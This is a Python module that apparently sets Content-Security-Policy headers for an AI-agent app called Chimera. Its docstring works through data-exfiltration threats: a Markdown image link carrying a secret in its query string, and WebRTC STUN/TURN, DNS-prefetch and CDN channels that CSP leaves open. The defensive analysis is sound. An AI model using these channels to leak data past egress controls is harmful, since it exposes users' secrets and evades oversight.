"""The Content-Security-Policy of the two HTML pages Chimera serves: the app, and the guest page.

**Why the page, and not each component.** The desktop window is not a bundled Tauri page: it is
this server's own `index.html`, loaded with `WebviewUrl::External`, so the `"csp": null` in
`tauri.conf.json` never applied to anything and the window ran with no policy at all. An agent's
answer rendered as Markdown could then carry `![x](https://host/?d=<secret>)` and the WebView
would GET that host on its own — outside the taint ledger and outside `CHIMERA_EGRESS_ALLOW`, which
govern what the *agent* reaches, not what the *screen* fetches. A policy on the page closes that
for every renderer at once, including the next `<Markdown>` someone adds; `SafeMarkdown` in the
app is the second layer, there so the person sees what was withheld instead of a broken image.

**What the app really loads**, enumerated before writing a directive, so nothing legitimate breaks:

* its own bundle, stylesheet, icon, manifest and service worker — same origin;
* the API, SSE streams and workspace images (fetched with the token, shown as `blob:`) — same
  origin, **or a remote Chimera** the person added under Servers. That feature only accepts
  `https://` or plain `http://` on loopback (`rejectReason` in `lib/server.ts`), so `connect-src`
  names exactly those; it is the reason the connect rule is not `'self'` alone;
* images the app itself builds as `data:` (the browser pane's JPEG frames) and `blob:` (workspace
  images, downloads); no web fonts at all.

**Why `script-src` is looser than the rest.** The HTML preview is an `iframe srcdoc`, and a srcdoc
document *inherits the parent's policy*: both policies must allow a script for it to run. The
`render_chart` page loads Vega from cdn.jsdelivr.net, runs an inline script, and Vega's expression
compiler uses `new Function`. Measured in headless Edge 154 (the engine WebView2 ships): without
`'unsafe-eval'` on the PARENT the chart draws nothing even when the frame's own policy allows it,
and without the CDN and `'unsafe-inline'` it never starts. So the parent carries those three, and
the frame's own `<meta>` policy (`HtmlPreview.tsx`) is what narrows the preview back down. What
is held tight here — images, connections, frames, forms, plugins — covers every channel a
Markdown answer can reach WITHOUT running code.

**What this policy does not close.** A page that runs script — only the HTML preview does — still
has ways out that CSP does not govern. Measured in headless Edge 154 with this header on the page
and the preview's meta in the frame: the frame's `fetch` to an outside host was blocked, but
`new RTCPeerConnection({iceServers: [{urls: "stun:…"}]})` sent STUN binding requests over UDP and
a `turn:…?transport=tcp` server received a TCP Allocate — CSP has no WebRTC directive in Chromium.
So a previewed page can still send data out: in a STUN/TURN hostname (through DNS) or to a TURN
server it names. `--webrtc-ip-handling-policy=disable_non_proxied_udp` on the browser stopped every
UDP packet in the same probe (the `--force-` spelling of that switch changed nothing) and did
NOT stop the TCP TURN connection, so it would narrow the channel, not close it; it is not set
(the window is built in `main.rs`, and the real WebView2 is unmeasured). Smaller ones: `<link rel=dns-prefetch>` is outside CSP (unmeasured here), and
`https://cdn.jsdelivr.net` in `script-src` admits any package or GitHub repository the page names,
with whatever the page puts in the path. The preview's note says this rather than claiming the
frame is sealed.

**`frame-src 'none'`** does not block the preview (a srcdoc frame is not a fetch), and it is what
stops the previewed page from navigating *its own frame* to `https://host/?d=…` — measured: with no
policy that navigation reached the outside host; with this one the parent refused it.
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from starlette.responses import Response
    from starlette.staticfiles import StaticFiles
    from starlette.types import Scope

# Sources a remote Chimera can live at: the Servers screen refuses anything else.
_REMOTE_SERVER_SOURCES = ("https:", "http://127.0.0.1:*", "http://localhost:*")

# The preview iframe inherits this policy, so these three are the chart's requirements, not the
# app's. Removing any of them blanks `render_chart`'s HTML output in the viewer.
_PREVIEW_SCRIPT_SOURCES = ("'unsafe-inline'", "'unsafe-eval'", "https://cdn.jsdelivr.net")

APP_PAGE_CSP = "; ".join(
    (
        "default-src 'self'",
        "script-src " + " ".join(("'self'", *_PREVIEW_SCRIPT_SOURCES)),
        # Inline <style>: Radix's scroll lock injects one, and the preview inherits this rule too,
        # so a previewed page's own <style> blocks (and the stylesheets the viewer inlines) need it.
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob:",
        "font-src 'self' data:",
        "media-src 'self' data: blob:",
        "connect-src " + " ".join(("'self'", *_REMOTE_SERVER_SOURCES)),
        "worker-src 'self'",
        "frame-src 'none'",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
    )
)

_INLINE_SCRIPT = re.compile(r"<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script\s*>", re.IGNORECASE | re.DOTALL)


def inline_script_hashes(html: str) -> list[str]:
    """`'sha256-…'` sources for each inline `<script>` in ``html``, in document order.

    The browser hashes the element's text after the HTML parser has normalised newlines (CRLF and
    a lone CR both become LF), so this does the same: a checkout with Windows line endings must not
    produce a hash that matches nothing, which would block the theme script on exactly one OS.
    """
    out: list[str] = []
    for body in _INLINE_SCRIPT.findall(html):
        text = body.replace("\r\n", "\n").replace("\r", "\n")
        digest = base64.b64encode(hashlib.sha256(text.encode("utf-8")).digest()).decode("ascii")
        source = f"'sha256-{digest}'"
        if source not in out:
            out.append(source)
    return out


def guest_page_csp(html: str) -> str:
    """The guest page's policy: the app's, minus everything only the app needs.

    The guest page is opened by someone who holds a share link and nothing else, in their own
    browser. It renders the conversation's answers as Markdown — the same image channel — but it
    has no HTML preview to inherit a loose `script-src` and no remote servers to reach, so its
    scripts are pinned to the bundle plus the exact hash of the inline theme script.
    """
    scripts = " ".join(("'self'", *inline_script_hashes(html)))
    return "; ".join(
        (
            "default-src 'self'",
            f"script-src {scripts}",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: blob:",
            "font-src 'self' data:",
            "connect-src 'self'",
            "frame-src 'none'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
        )
    )


# An HTML file served from `/assets` is nothing the app ships: Vite puts only scripts, styles and
# images there. If one ever appears it gets no rights at all — `sandbox` gives it an opaque origin
# (no token, no storage, no API) and `default-src 'none'` lets it fetch nothing.
ASSET_HTML_CSP = "default-src 'none'; sandbox"

_HTML_SUFFIXES = (".html", ".htm", ".xhtml")


def static_files_with_policy(directory: Path) -> StaticFiles:
    """`StaticFiles` for `/assets`, with a policy on anything in it a browser would render as a page.

    Defense in depth, not a hole being closed: `dist/` is not writable by the agent and the build
    puts no HTML under `assets/`. But the page handlers are the only routes that set a policy, so a
    stray `assets/x.html` was served same-origin with none — measured: 200, `text/html`, no header.
    """
    from starlette.staticfiles import StaticFiles

    class _PolicedStaticFiles(StaticFiles):
        def file_response(
            self,
            full_path: str | os.PathLike[str],
            stat_result: os.stat_result,
            scope: Scope,
            status_code: int = 200,
        ) -> Response:
            response = super().file_response(full_path, stat_result, scope, status_code)
            if str(full_path).lower().endswith(_HTML_SUFFIXES):
                response.headers["Content-Security-Policy"] = ASSET_HTML_CSP
            return response

    return _PolicedStaticFiles(directory=directory)
